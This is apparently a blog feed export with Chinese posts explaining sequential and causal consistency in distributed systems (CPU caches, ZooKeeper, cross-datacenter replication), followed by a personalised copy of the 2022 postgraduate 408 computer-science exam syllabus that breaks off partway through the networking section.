<h2 id="什么是一致性？"><a href="#什么是一致性？" class="headerlink" title="什么是一致性？"></a>什么是一致性？</h2><p>一般我们会说“A 和 B 是一致的”，在分布式系统中，一致性指的是程序员对系统的预期和系统的实际行为是一致的。举例来说，我们首先发送写请求 <code>W(X, 2)</code>，再尝试读取该变量<code>R(X)</code>，如果预期是 <code>R(X)=2</code>，而系统的实际上返回 <code>R(X)=0</code>，则说我们对系统的预期和实际的行为不一致。</p>
<p>而当我们说 “XX 一致性” 实际上描述的系统能对我们提供的 XX 保证。例如最终一致性保证的是对系统中的某一项数据，如果经过足够长的时间没有新的修改发生，则所有对它的访问都将返回最后一次修改的值，而对于“不够长”的时间内的访问情况它却没有做任何保证。</p>
<h2 id="什么是顺序一致性？"><a href="#什么是顺序一致性？" class="headerlink" title="什么是顺序一致性？"></a>什么是顺序一致性？</h2><p>顺序一致性最早是用来描述多核 CPU 的行为的，定义如下：</p>
<blockquote>
<p>… the result of any execution is the same as if the operations of all the processors were executed in some sequential order, and the operations of each individual processor appear in this sequence in the order specified by its program.</p>
</blockquote>
<p>如果可以找到一个所有 CPU 执行指令的排序，该排序中每个 CPU 要执行指令的顺序得以保持，且实际的 CPU 执行结果与该指令排序的执行结果一致，则称该次执行达到了顺序一致性。例如：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451858.svg" alt="Sequential Consistency"></p>
<p>图中 <code>W(X, 1)</code> 代表将 1 写入变量 X；<code>R(X, 1)</code> 代表读取变量 X，值为 1；横轴代表时间；矩形的长短代表指令持续的时间长短，所以上图其实表示的是多核 CPU 的一次执行结果。</p>
<p>我们找到了指令的一个排序，排序中各个 CPU 的指令顺序得以保持（如 <code>C: R(X, 1)</code> 在 <code>C: R(X, 2)</code> 之前），这个排序的执行结果与 CPU 分开执行的结果一致，因此该 CPU 的执行是满足顺序一致性的。</p>
<p><strong>注意到顺序一致性关心的是 CPU 内部执行指令的顺序，而不关心 CPU 之间的相对顺序。</strong></p>
<h2 id="更多正反例"><a href="#更多正反例" class="headerlink" title="更多正反例"></a>更多正反例</h2><p>考虑将上图的 <code>C:R(X, 1)</code> 与 <code>D:R(X, 2)</code> 替换一下呢？如下图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451859.svg" alt="Sequential Consistency Swap 1"></p>
<p>可以看到我们依然可以找到一个满足要求的全局排序，所以系统依旧满足顺序一致性。那如果我们只是将原图的 <code>D:R(X, 1)</code> 和 <code>D:R(X, 2)</code> 互换呢？如下图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451860.svg" alt="Sequential Consistency Swap 2"></p>
<p>对于上图的系统，实际上是找不到一个全局的排序来满足顺序一致性的需求的。根本上，从 C 的顺序推导出 X 的写入顺序为 <code>1 -&gt; 2</code>，而同时由 D 推出写入顺序为 <code>2 -&gt; 1</code> ，二者矛盾。那如果只有 A 在写入呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451861.svg" alt="Sequential Consistency Swap 3"></p>
<p>上图也不满足顺序一致性，由 C、D 推导出写入顺序为 <code>1 -&gt; 2</code>，而由 A 推出顺序为 <code>2 -&gt; 1</code>，矛盾。</p>
<h2 id="顺序一致性难吗？"><a href="#顺序一致性难吗？" class="headerlink" title="顺序一致性难吗？"></a>顺序一致性难吗？</h2><p>难，现代的多核 CPU 依然达不到顺序一致性。</p>
<p>我们知道 CPU 执行的主要瓶颈其实是在与内存交互，工程师为了让 CPU 能高速执行，在 CPU 内部使用了多级缓存。它的存在，使得即使 CPU 内部顺序执行指令，指令的结果也可能不满足顺序一致性：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451862.svg" alt="CPU Cache and Sequential Consistency"></p>
<p>上图中 <code>(n)</code> 代表数据的读写步骤。如果 CPU 如上图执行，则得到的结果不满足顺序一致性。</p>
<p>另外 CPU 执行时会乱序执行指令。例如在一些情况下 CPU 会将数据写入的指令提前执行，因为写入内存是很耗时的。同样的，编译器在编译代码时也会重排代码中的指令的顺序，以提升整体的性能。</p>
<p>难以想象，没有了顺序一致性的保证，程序居然还能正确执行。其实，现代硬件体系遵循的其实是:</p>
<blockquote>
<p>sequential consistency for data race free programs</p>
</blockquote>
<p>即如果程序没有数据竞争，则 CPU 可以保证顺序一致性，而如果遇到数据竞争，就需要程序里手工使用一些数据同步的机制（如锁）。</p>
<p>工程领域总是伴随着各种权衡(trade-off)，显然保证顺序一致性对 CPU 的性能优化有太多的阻碍，而 CPU 的高性能又是我们所追求的，两害相权取其轻。</p>
<h2 id="Zookeeper-中的顺序一致性"><a href="#Zookeeper-中的顺序一致性" class="headerlink" title="Zookeeper 中的顺序一致性"></a>Zookeeper 中的顺序一致性</h2><p>Zookeeper 的一致性保证第一条是：</p>
<blockquote>
<p>Sequential Consistency : Updates from a client will be applied in the order that they were sent.</p>
</blockquote>
<p>顺序一致性：客户端发送的更新命令，服务端会按它们发送的顺序执行。</p>
<p>（其实 zookeeper 文档里描述的顺序一致性和本文描述的不太一样）</p>
<p>Zookeeper 的所有写操作都通过主节点进行，从节点复制修改操作，这样所有节点的更新顺序都和主节点相同，不会出现某个节点的更新顺序与其它节点不同的情况。</p>
<p>但是Zookeeper 允许客户端从从节点读取数据，因此如果客户端在读取过程中连接了不同的节点，则顺序一致性就得不到保证了。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451863.svg" alt="Zookeeper Inconsistency"></p>
<p>如上图，主节点的 <code>X=2</code> 消息还没有同步到 Follower 2，此时如果有两个客户端：</p>
<ul>
<li>A: 先后连接到 Follower 1 和 Follower 2，则读到 X 的值为 <code>2 -&gt; 1</code></li>
<li>B: 先后连接到 Follower 2 和 Follower 1，则读到 X 的值为 <code>1 -&gt; 2</code></li>
</ul>
<p>显然不满足顺序一致性，因此 zookeeper 又有“单一视图”的保证，保证在连接到 Follower 2 后，不会连上状态更老的 Follower 1。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>文中试图描述什么是“顺序一致性”，并给出了几个正反例；之后说明了 CPU 达不到顺序一致性的几个原因；最后简单地说明了 zookeeper 为什么能保证顺序一致性。水平有限，只能点到为止了。</p>
<p>最后感叹下，设计里一切都是 trade off 啊。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://wudaijun.com/2018/09/distributed-consistency/">https://wudaijun.com/2018/09/distributed-consistency/</a> 清晰讲解了顺序一致性及线性一致性等概念</li>
<li><a href="https://www.cs.princeton.edu/courses/archive/fall16/cos418/docs/L13-strong-cap.pdf">https://www.cs.princeton.edu/courses/archive/fall16/cos418/docs/L13-strong-cap.pdf</a> 关于强一致性与 CAP 理论的 PPT</li>
<li><a href="https://snarfed.org/transactions_across_datacenters_io.html">https://snarfed.org/transactions_across_datacenters_io.html</a> Google 2009 年的一个分享，总结了业内一致性协议的一些实践</li>
</ul>
<h1 id="深入浅析一致性模型之Causal-Consistency"><a href="#深入浅析一致性模型之Causal-Consistency" class="headerlink" title="深入浅析一致性模型之Causal Consistency"></a>深入浅析一致性模型之Causal Consistency</h1><h2 id="Causal-consistency的定义"><a href="#Causal-consistency的定义" class="headerlink" title="Causal consistency的定义"></a>Causal consistency的定义</h2><p>Causal consistency叫做因果一致性，被认为是比Sequential Consistency更弱的一致性，因为在Causal consistency中，只对有因果关系的事件有顺序要求。</p>
<p>Causal consistency的概念最早在《Causal memory: Definitions, implementation, and programming》一文中被提出。随后在《Consistency, Availability, and Convergence》一文中，作者用happens before关系的有向无环图定义了Causal consistency，并且提出了real time causal consistency一致性模型。这篇文章得出了以下两个重要的结论，有兴趣的同学可以读一下原文：</p>
<ol>
<li>No consistency stronger than real time causal (RTC) consistency, a strengthening of causal consistency, can be provided in an always-available, one-way convergent system.</li>
<li>RTC can be provided in an always-available, one-way convergent system.</li>
</ol>
<p>Causal consistency要求如果两个事件有因果关系，那么在所有节点上必须观测到这个因果关系。</p>
<h2 id="Causal-consistency的例子"><a href="#Causal-consistency的例子" class="headerlink" title="Causal consistency的例子"></a>Causal consistency的例子</h2><p>比如下图中，我们认为P2写入的3是基于它读出来的1计算出来的，它读出来的1又是由P1的写入产生的，因此认为P1写入1和P2写入3具有因果关系。P4没有观测到这个因果关系，所以这个系统不具备Causal Consistency。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451864.jpg" alt="img"></p>
<p>而下图中，认为P2写入3和P1写入1不具有因果关系，则P4和P3可以以任意顺序观测到它们。这个系统仍然可以说具有Causal consistency，但是不具备Sequential Consistency。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451865.jpg" alt="img"></p>
<h2 id="Causal-consistency的应用"><a href="#Causal-consistency的应用" class="headerlink" title="Causal consistency的应用"></a>Causal consistency的应用</h2><p>Causal consistency一般应用在跨地域同步数据中心系统中，例如Facebook、微信这样的应用程序，全球各地的用户，往往会访问其距离最近的数据中心，数据中心之间再进行双向的数据同步。为了减小数据同步的延迟，往往并行的同步数据。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451866.jpg" alt="img"></p>
<p>没有因果一致性时会发生如下情形：</p>
<ol>
<li>夏侯铁柱在朋友圈发表状态“我戒指丢了”</li>
<li>夏侯铁柱在同一条状态下评论“我找到啦”</li>
<li>诸葛建国在同一条状态下评论“太棒了”</li>
<li>远在美国的键盘侠看到“我戒指丢了”“太棒了”，开始喷诸葛建国</li>
<li>远在美国的键盘侠看到“我戒指丢了”“我找到啦”“太棒了”，意识到喷错人了</li>
</ol>
<p>或者：</p>
<ol>
<li>夏侯铁柱从好友中删除了诸葛建国</li>
<li>夏侯铁柱发表了朋友圈“清理了一波没用的好友”</li>
<li>远在美国的诸葛建国看到了该朋友圈</li>
<li>诸葛建国想去点个赞。。。</li>
</ol>
<p>所以很多系统采用因果一致性系统来避免这种问题，我们将会在后续的文章中介绍。</p>
<blockquote>
<p>例如微信的朋友圈就采用了因果一致性，但是它的资料有点过于简略，有兴趣的可以参考<a href="https://link.zhihu.com/?target=https://www.useit.com.cn/thread-10587-1-1.html">https://www.useit.com.cn/thread-10587-1-1.html</a></p>
</blockquote>
<blockquote>
<p>更多相关内容，请参考系列文章<a href="https://link.zhihu.com/?target=https://www.imooc.com/article/286118">《如何学习分布式系统》</a>。</p>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="http://www.chinastor.com/s/openstack/10093K202017.html">http://www.chinastor.com/s/openstack/10093K202017.html</a></li>
<li><a href="https://blog.csdn.net/controllerha/article/details/78766840">https://blog.csdn.net/controllerha/article/details/78766840</a></li>
<li><a href="https://zhaohongbo.github.io/2017/02/22/Byzantine-Generals-Problem/">https://zhaohongbo.github.io/2017/02/22/Byzantine-Generals-Problem/</a></li>
</ol>
<iframe name="easyXDM_default6444_provider" id="easyXDM_default6444_provider" src="https://embed.widgetpack.com/widget/xdm/index.html?xdm_e=https%3A%2F%2Fkeyanjie.net&amp;xdm_c=default6444&amp;xdm_p=1" frameborder="0" style="color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; position: absolute !important; top: -2000px !important; left: 0px !important;"></iframe>



]]></content>
      <categories>
        <category>ustc</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年考研408计算机学科考试大纲</title>
    <url>/2021/10/20/%E8%80%83%E7%A0%94/2022%E5%B9%B4%E8%80%83%E7%A0%94408%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E7%A7%91%E8%80%83%E8%AF%95%E5%A4%A7%E7%BA%B2/</url>
    <content><![CDATA[<h1 id="2022年考研408计算机学科考试大纲"><a href="#2022年考研408计算机学科考试大纲" class="headerlink" title="2022年考研408计算机学科考试大纲"></a>2022年考研408计算机学科考试大纲</h1><blockquote>
<p><strong>叶纯宝宝专用版</strong></p>
</blockquote>
<p><strong>I 考试性质</strong></p>
<p>计算机学科专业基础综合考试是为高等院校和科研院所招收计算机科学与 技术学科的硕士研究生而设置的具有选拔性质的联考科目，其目的是科学、公平、 有效地测试考生掌握计算机科学与技术学科大学本科阶段专业知识、基本理论、 基本方法的水平和分析问题、解决问题的能力，评价的标准是高等院校计算机科 学与技术学科优秀本科毕业生所能达到的及格或及格以上水平，以利于各高等院 校和科研院所择优选拔，确保硕士研究生的招生质量。</p>
<p><strong>II 考查目标</strong></p>
<p>计算机学科专业基础综合考试涵盖数据结构、计算机组成原理、操作系统和 计算机网络等学科专业基础课程。要求考生比较系统地掌握上述专业基础课程的 基本概念、基本原理和基本方法，能够综合运用所学的基本原理和基本方法分析、 判断和解决有关理论问题和实际问题。</p>
<p><strong>III 试形式和试卷结构</strong></p>
<p>一、试卷满分及考试时间</p>
<p>本试卷满分为 150 分，考试时间为 180 分钟。</p>
<p>二、答题方式</p>
<p>答题方式为闭卷、笔试。</p>
<p> 三、试卷内容结构</p>
<p>数据结构 45 分、计算机组成原理 45 分、操作系统 35 分、计算机网络 25 分 </p>
<p>四、试卷题型结构</p>
<p>单项选择题 80 分 (40 小题，每小题 2 分)、综合应用题 70 分 </p>
<p><strong>IV 考查内容</strong></p>
<h2 id="【数据结构】"><a href="#【数据结构】" class="headerlink" title="【数据结构】"></a><strong>【数据结构】</strong></h2><p><strong>【考查目标】</strong></p>
<p>1.掌握数据结构的基本概念、基本原理和基本方法。</p>
<p>2.掌握数据的逻辑结构、存储结构及基本操作的实现，能够对算法进行基本 的时间复杂度与空间复杂度的分析。</p>
<p>3.能够运用数据结构基本原理和方法进行问题的分析与求解，具备采用 C 或 C++语言设计与实现算法的能力。</p>
<h3 id="一、线性表-爱你哟"><a href="#一、线性表-爱你哟" class="headerlink" title="一、线性表 爱你哟"></a>一、线性表 爱你哟</h3><p>(一)线性表的基本概念 </p>
<p>(二)线性表的实现</p>
<p>1.顺序存储</p>
<p>2.链式存储 </p>
<p>(三)线性表的应用</p>
<h3 id="二、栈、队列和数组"><a href="#二、栈、队列和数组" class="headerlink" title="二、栈、队列和数组"></a>二、栈、队列和数组</h3><p> (一)栈和队列的基本概念</p>
<p> (二)栈和队列的顺序存储结构 </p>
<p>(三)栈和队列的链式存储结构 </p>
<p>(四)多维数组的存储 </p>
<p>(五)特殊矩阵的压缩存储</p>
<p> (六)栈、队列和数组的应用</p>
<h3 id="三、树与二叉树"><a href="#三、树与二叉树" class="headerlink" title="三、树与二叉树"></a>三、树与二叉树</h3><p>(一)树的基本概念 </p>
<p>(二)二叉树</p>
<p>1.二叉树的定义及其主要特征</p>
<p>2.二叉树的顺序存储结构和链式存储结构</p>
<p>3.二叉树的遍历</p>
<p>4.线索二叉树的基本概念和构造 </p>
<p>(三) 树、森林</p>
<p>1.树的存储结构</p>
<p>2.森林与二叉树的转换</p>
<p>3.树和森林的遍历 </p>
<p>(四)树与二叉树的应用</p>
<p>1.哈夫曼(Huffman)树和哈夫曼编码</p>
<p>2.并查集及其应用</p>
<h3 id="四、图"><a href="#四、图" class="headerlink" title="四、图"></a>四、图</h3><p>(一)图的基本概念</p>
<p> (二)图的存储及基本操作</p>
<p>1.邻接矩阵法</p>
<p>2.邻接表法</p>
<p>3.邻接多重表、十字链表 </p>
<p>(三)图的遍历</p>
<p>1.深度优先搜索</p>
<p>2.广度优先搜索</p>
<p> (四)图的基本应用</p>
<p>1.最小(代价)生成树</p>
<p>2.最短路径</p>
<p>3.拓扑排序</p>
<p>4.关键路径 </p>
<h3 id="五、查找"><a href="#五、查找" class="headerlink" title="五、查找"></a>五、查找</h3><p>(一)查找的基本概念 </p>
<p>(二)顺序查找法 </p>
<p>(三)分块查找法 </p>
<p>(四)折半查找法</p>
<p>(五)B 树及其基本操作、B+树的基本概念 </p>
<p>(六)散列(Hash)表</p>
<p>(七)树型查找 </p>
<p>1.二叉搜索树</p>
<p>2.平衡二叉树</p>
<p>3.红黑树 </p>
<h3 id="六、排序"><a href="#六、排序" class="headerlink" title="六、排序"></a>六、排序</h3><p>(一)排序的基本概念</p>
<p> (二)插入排序</p>
<p>1.直接插入排序</p>
<p>2.折半插入排序</p>
<p> (三)气泡排序(bubble sort) </p>
<p>(四)简单选择排序 </p>
<p>(五)希尔排序(shell sort)</p>
<p>(六)快速排序</p>
<p> (七)堆排序</p>
<p>(八)二路归并排序(merge sort) </p>
<p>(九)基数排序</p>
<p>(十)外部排序 </p>
<p>(十一)排序算法的分析与应用</p>
<h2 id="【计算机组成原理】"><a href="#【计算机组成原理】" class="headerlink" title="【计算机组成原理】"></a><strong>【计算机组成原理】</strong></h2><p><strong>【考查目标】</strong></p>
<p>1.理解单处理器计算机系统中各部件的内部工作原理、组成结构以及相互连 接方式，具有完整的计算机系统的整机概念。</p>
<p>2.理解计算机系统层次化结构概念，熟悉硬件与软件之间的界面，掌握指令 集体系结构的基本知识和基本实现方法。</p>
<p>3.能够综合运用计算机组成的基本原理和基本方法，对有关计算机硬件系统 中的理论和实际问题进行计算、分析，对一些基本部件进行简单设计; 并能对高级程序设计语言(如 C 语言)中的相关问题进行分析。</p>
<h3 id="一、计算机系统概述"><a href="#一、计算机系统概述" class="headerlink" title="一、计算机系统概述"></a>一、计算机系统概述</h3><p>(一)计算机系统层次结构</p>
<p>1.计算机系统的基本组成</p>
<p>2.计算机硬件的基本结构</p>
<p>3.计算机软件和硬件的关系</p>
<p>4.计算机系统的工作原理 “存储程序”工作方式，高级语言程序与机器语言程序之间的转换,程序</p>
<p>和指令的执行过程 </p>
<p>(二)计算机性能指标</p>
<p>吞吐量、响应时间;CPU 时钟周期、主频、CPI、CPU 执行时间;MIPS、 MFLOPS 、GFLOPS、TFLOPS、PFLOPS、EFLOPS、ZFLOPS。</p>
<h3 id="二、数据的表示和运算"><a href="#二、数据的表示和运算" class="headerlink" title="二、数据的表示和运算"></a>二、数据的表示和运算</h3><p> (一)数制与编码  超级爱你哟</p>
<p>1.进位计数制及其相互转换</p>
<p>2.真值和机器数</p>
<p>3.字符与字符串</p>
<p> (二)定点数的表示和运算 </p>
<p>1.定点数的表示</p>
<p>无符号数的表示;有符号整数的表示。 </p>
<p>2.定点数的运算</p>
<p>定点数的位移运算;原码定点数的加减运算;补码定点数的加&#x2F;减运算; 定点数的乘&#x2F;除运算;溢出概念和判别方法。</p>
<p>(三)浮点数的表示和运算</p>
<p>1.浮点数的表示 IEEE 754 标准</p>
<p>2.浮点数的加&#x2F;减运算</p>
<p> (四)运算方法和运算电路【表述变更】</p>
<p>1.基本运算部件：加法器、算数逻辑部件 ALU</p>
<p>2.减法运算：补码加减运算器，标志位的生成</p>
<p>3.乘除运算：乘除运算的基本原理，乘除发电路的基本结构 </p>
<h3 id="三、存储器层次结构"><a href="#三、存储器层次结构" class="headerlink" title="三、存储器层次结构"></a>三、存储器层次结构</h3><p>(一)存储器的分类 </p>
<p>(二)层次化存储器的的基本结构</p>
<p> (三)半导体随机存取存储器</p>
<p>1.SRAM 存储器</p>
<p>2.DRAM 存储器 3.Flash 存储器</p>
<p>(四)主存储器</p>
<p>1.DRAM 芯片和内存条</p>
<p>2.多模块存储器</p>
<p>3.主存和 CPU 之间的连接</p>
<p> (五)外部存储器</p>
<p>1.磁盘存储器</p>
<p>2.固态硬盘(SSD) </p>
<p>(六)高速缓冲存储器(Cache)</p>
<p>1.Cache 的基本工作原理</p>
<p>2.Cache 和主存之间的映射方式</p>
<p>3.Cache 中主存块的替换算法</p>
<p> 4.Cache 写策略</p>
<p>(七)虚拟存储器 </p>
<p>1.虚拟存储器的基本概念</p>
<p>2.页式虚拟存储器 基本原理，页表，地址转换，TLB (快表)。 </p>
<p>3.段式虚拟存储器</p>
<p>4.段页式虚拟存储器 四、指令系统</p>
<p>(一)指令系统的基本概念</p>
<p>(二)指令格式 </p>
<p>(三)寻址方式</p>
<p>(四)数据的对齐和大&#x2F;小端存放方式 </p>
<p>(五) CISC 和 RISC 的基本概念</p>
<p>(六)高级语言程字与机器级代码之间的对应 </p>
<p>1.编译器、汇编器和链接器的基本概念</p>
<p>2.选择结构语句的机器级表示</p>
<p>3.循环结构语句的机器级表示</p>
<p>4.过程(函数)调用对应的机器级表示</p>
<h3 id="五、中央处理器-CPU"><a href="#五、中央处理器-CPU" class="headerlink" title="五、中央处理器(CPU)"></a>五、中央处理器(CPU)</h3><p>(一)CPU 的功能和基本结构</p>
<p> (二)指令执行过程 </p>
<p>(三)数据通路的功能和基本结构 </p>
<p>(四)控制器的功能和工作原理</p>
<p>1、硬布线控制器</p>
<p>2、微程序控制器 微程序、微指令和微命令;微指令的编码方式;微地址的形式方式。</p>
<p>(五)异常和中断机制 </p>
<p>1.异常和中断的基本概念</p>
<p>2.异常和中断的分类</p>
<p>3.异常和中断的检测与响应 </p>
<p>(六)指令流水线</p>
<p>1.指令流水线的基本概念</p>
<p>2.指令流水线的基本实现</p>
<p>3.结构冒险、数据冒险和控制冒险的处理</p>
<p>4.超标量和动态流水线的基本概念</p>
<p>(七)多处理器基本概念</p>
<p>1.SISD、SIMD、MIMD、向量处理器的基本概念</p>
<p>2.硬件多线程的基本概念 </p>
<p>3.多核处理器(multi-core)的基本概念 </p>
<p>4.共享内存多处理器(SMP)的基本概念</p>
<h3 id="六、总线和输出输出系统"><a href="#六、总线和输出输出系统" class="headerlink" title="六、总线和输出输出系统"></a>六、总线和输出输出系统</h3><p>(一)总线概述</p>
<p>1.总线的基本概念</p>
<p>2.总线的组成及性能指标</p>
<p>3.总线事务和定时</p>
<p> (二)I&#x2F;O 接口(I&#x2F;O 控制器)</p>
<p>1.I&#x2F;O 接口的功能和基本结构</p>
<p>2.I&#x2F;O 端口及其编址 </p>
<p>(三)I&#x2F;O 方式</p>
<p>1.程序查询方式</p>
<p>2.程序中断方式 </p>
<p>中断的基本概念;中断响应过程;中断处理过程;多重中断和中断屏蔽的概念。</p>
<p>3.DMA 方式</p>
<p>DMA 控制器的组成，DMA 传送过程。</p>
<h2 id="【操作系统】"><a href="#【操作系统】" class="headerlink" title="【操作系统】"></a><strong>【操作系统】</strong></h2><p><strong>【考查目标】</strong></p>
<p>1.掌握操作系统的基本概念、基本原理和基本功能，理解操作系统的整体运行过程。</p>
<p>2.掌握操作系统进程、内存、文件和 I&#x2F;O 管理的策略、算法、机制以及相 互关系。</p>
<p>3.能够运用所学的操作系统原理、方法与技术分析问题和解决问题，并能利 用 C 语言描述相关算法。</p>
<h3 id="一、操作系统概述"><a href="#一、操作系统概述" class="headerlink" title="一、操作系统概述"></a>一、操作系统概述</h3><p>(一)操作系统的基本概念</p>
<p> (二)操作系统的发展</p>
<p>(三)程序运行环境</p>
<p>1.CPU 运行模式 内核模式，用户模式。</p>
<p>2.中断和异常的处理</p>
<p>3.系统调用</p>
<p>4.程序的链接与装入</p>
<p>5.程序运行时内存映像与地址空间</p>
<p> (四)操作系统结构</p>
<p>分层，模块化，宏内核，微内核，外核。</p>
<p> (五)操作系统引导</p>
<p>(六)虚拟机</p>
<h3 id="二、进程管理"><a href="#二、进程管理" class="headerlink" title="二、进程管理"></a>二、进程管理</h3><p>(一)进程与线程</p>
<p>1.进程概念</p>
<p>2.进程的状态与转换</p>
<p>3.线程的实现 内核支持的线程，线程库支持的线程。</p>
<p>4.进程与线程的组织与控制</p>
<p>5.进程间通信 共享内存，消息传递，管道。</p>
<p>(二)CPU 调度与上下文切换 </p>
<p>1.调度的基本概念</p>
<p>2.调度的目标</p>
<p>3.调度的实现 调度器&#x2F;调度程序(scheduler)，调度的时机与调度方式(抢占式&#x2F;非抢占式)，闲逛进程，内核级线程与用户级线程调度。</p>
<p>4.典型调度算法</p>
<p>先来先服务调度算法; 短作业(短进程、短线程)优先调度算法; 时间片轮转调度算法;优先级调度算法; 高响应比优先调度算法; 多级反馈队列调度算法。</p>
<p>5.上下文及其切换机制</p>
<p>(三)同步与互斥</p>
<p>1.进程同步的基本概念</p>
<p>2.实现临界区互斥的基本方法 软件实现方法;硬件实现方法。</p>
<p>3.锁</p>
<p>4.信号量</p>
<p>5.条件变量</p>
<p>6.经典同步问题</p>
<p>生产者-消费者问题;读者-写者问题;哲学家进餐问题。</p>
<p>(四)死锁</p>
<p>1.死锁的概念</p>
<p>2.死锁预防</p>
<p>3.死锁避免</p>
<p>4.死锁检测和解除</p>
<h3 id="三、内存管理"><a href="#三、内存管理" class="headerlink" title="三、内存管理"></a>三、内存管理</h3><p>(一)内存管理基础</p>
<p>1.内存管理的基本概念 程序装入与链接;逻辑地址与物理地址空间;内存保护。内存分配与回收</p>
<p>2.连续分配管理方式</p>
<p>3.分页管理方式</p>
<p>4.分段管理方式</p>
<p>5.段页式管理方式。</p>
<p> (二)虚拟内存管理</p>
<p>1.虚拟内存基本概念</p>
<p>2.请求分页管理方式</p>
<p>3.页框分配</p>
<p>4.页面置换算法 最佳置换算法(OPT);先进先出置换算法(FIFO);最近最少使用置换算法</p>
<p>(LRU);时钟置换算法(CLOCK)。 </p>
<p>5.内存映射文件(Memory-Mapped Flies)</p>
<p>6.虚拟存储器性能的影响因素及改进方法</p>
<h3 id="四、文件管理"><a href="#四、文件管理" class="headerlink" title="四、文件管理"></a>四、文件管理</h3><p>(一)文件系统基础</p>
<p>1.文件概念</p>
<p>2.文件元数据和索引节点</p>
<p>3.文件的操作 建立，删除，打开，关闭，读，写。</p>
<p> 4.文件共享</p>
<p>5.文件的逻辑结构</p>
<p>6.文件的物理结构</p>
<p> (二)目录</p>
<p>1.目录的基本概念</p>
<p>2.树形目录</p>
<p>3.目录的操作</p>
<p>4.硬链接与软链接</p>
<p>(三)文件系统</p>
<p>1.文件系统的全局结构(layout) 文件系统在外存中的结构，文件系统在内存中的结构。</p>
<p>2.外存空闲空间管理方法</p>
<p>3.虚拟文件系统</p>
<p>4.文件系统挂载(mounting)</p>
<h3 id="五、输入输出-I-x2F-O-管理"><a href="#五、输入输出-I-x2F-O-管理" class="headerlink" title="五、输入输出(I&#x2F;O)管理"></a>五、输入输出(I&#x2F;O)管理</h3><p>(一)1&#x2F;O 管理基础</p>
<p>1.设备</p>
<p>设备的基本概念，设备的分类，I&#x2F;O 接口，I&#x2F;O 端口。 </p>
<ol start="2">
<li>I&#x2F;O 控制方式</li>
</ol>
<p>轮询方式，中断方式，DMA 方式。 </p>
<ol start="3">
<li>I&#x2F;O 软件层次结构</li>
</ol>
<p>中断处理程序，驱动程序,设备独立软件，用户层 I&#x2F;O 软件。 </p>
<p>4.输入输出应用程序接口 字符设备接口，块设备接口，网络设备接口，阻塞&#x2F;非阻塞 I&#x2F;O。</p>
<p>(二)设备独立软件</p>
<p>1.缓冲区管理</p>
<p>2.设备分配与回收</p>
<p>3.假脱机技术(SPOOLing)</p>
<p>4.设备驱动程序接口 </p>
<p>(三)外存管理</p>
<p>1.磁盘 磁盘结构，格式化，分区，磁盘调度方法。 </p>
<p>2.固态硬盘</p>
<p>读写性能特性，磨损均衡。</p>
<h2 id="【计算机网络】"><a href="#【计算机网络】" class="headerlink" title="【计算机网络】"></a><strong>【计算机网络】</strong></h2><p><strong>【考查目标】</strong></p>
<p>1.掌握计算机网络的基本概念、基本原理和基本方法。</p>
<p>2.掌握计算机网络的体系结构和典型网络协议，了解典型网络设备的组成和特 点，理解典型网络设备的工作原理。</p>
<p>3.能够运用计算机网络的基本概念、基本原理和基本方法进行网络系统的分析、 设计和应用。</p>
<h3 id="一、计算机网络体系结构"><a href="#一、计算机网络体系结构" class="headerlink" title="一、计算机网络体系结构"></a>一、计算机网络体系结构</h3><p> (一)计算机网络概述</p>
<p>1.计算机网络的概念、组成与功能</p>
<p>2.计算机网络的分类</p>
<p>3.计算机网络主要性能指标</p>
<p> (二)计算机网络体系结构与参考模型</p>
<p>1.计算机网络分层结构</p>
<p>2.计算机网络协议、接口、服务等概念</p>
<p>3.ISO&#x2F;OSI 参考模型和 TCP&#x2F;IP 模型</p>
<h3 id="二、物理层"><a href="#二、物理层" class="headerlink" title="二、物理层"></a>二、物理层</h3><p>(一)通信基础 </p>
<p>1.信道、信号、宽带、码元、波特、速率、信源与信宿等基本概念</p>
<p>2.奈奎斯特定理与香农定理</p>
<p>3.编码与调制</p>
<p>4.电路交换、报文交换与分组交换</p>
<p>5.数据报与虚电路</p>
<p>(二)传输介质</p>
<p>1.双绞线、同轴电缆、光纤与无线传输介质</p>
<p>2.物理层接口的特性</p>
<p> (三)物理层设备</p>
<p>1.中继器</p>
<p>2.集线器</p>
<h3 id="三、数据链路层"><a href="#三、数据链路层" class="headerlink" title="三、数据链路层"></a>三、数据链路层</h3><p>(一)数据链路层的功能</p>
<p>(二)组帧</p>
<p>(三)差错控制</p>
<p>1.检错编码</p>
<p>2.纠错编码</p>
<p> (四)流量控制与可靠传输机制</p>
<p>1.流量控制、可靠传输与滑轮窗口机制</p>
<p>2.停止-等待协议</p>
<p>3.后退 N 帧协议(GBN)</p>
<p>4.选择重传协议(SR)</p>
<p> (五)介质访问控制</p>
<p>1.信道划分</p>
<p>频分多路复用、时分多路复用、波分多路复用、码分多路复用的概念和基本原理。</p>
<p>2.随即访问</p>
